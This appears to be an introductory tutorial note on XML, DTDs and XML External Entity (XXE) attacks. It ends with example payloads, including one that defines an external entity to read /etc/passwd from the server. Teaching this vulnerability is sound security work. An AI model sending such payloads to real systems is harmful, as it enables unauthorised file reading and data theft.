## What is XML?
- XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.

### XML Pros

- is platform-independent and programming language independent
- data stored and transported using XML can be changed at any point in time without affecting the data presentation.
-  allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
- XML simplifies data sharing between various systems because of its platform-independent nature


#### Example of XML data
```
<?xml version="1.0" encoding="UTF-8"?>  // xml prolog
<mail>  //root element
   <to>falcon</to>  /*
   <from>feast</from>  
   <subject>About XXE</subject>  
   <text>Teach about XXE</text> */ child elements
</mail>
```


__NB__ : XML is a case sensitive language.

### DTD

- DTD stands for Document Type Definition.
- A DTD defines the structure and the legal elements and attributes of an XML document.

**Example**
```
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>

// The above dtd code(note.dtd) relates to the xml code making sure that it conforms to its rules

<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE note SYSTEM "note.dtd">  
<note>  
    <to>falcon</to>  
    <from>feast</from>  
    <heading>hacking</heading>  
    <body>XXE attack</body>  
</note>


// What it means

#PCDATA means parseable character data.

!DOCTYPE note -  Defines a root element of the document named note
!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
!ELEMENT to - Defines the `to` element to be of type "#PCDATA"
!ELEMENT from - Defines the `from` element to be of type "#PCDATA"
!ELEMENT heading  - Defines the `heading` element to be of type "#PCDATA"
!ELEMENT body - Defines the `body` element to be of type "#PCDATA"
 
```
 
## XXE
  
  - Is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.



##  Types of XXE Attacks

### 1). In-band XXE

-  in which the attacker can receive an immediate response to the XXE payload.

### 2). Out- of Band/ Blind XXE

 - there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.


### XXE Payloads

```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>  
 <userInfo>  
  <firstName>falcon</firstName>  
  <lastName>&name;</lastName>  
 </userInfo>

// we are defining a `ENTITY` called `name` and assigning it a value `feast`
```


Reading files
```
<?xml version="1.0"?>  
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>


// to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

// we are defining an ENTITY with the name `read` but the difference is that we are setting it value to `SYSTEM` and path of the file.
```

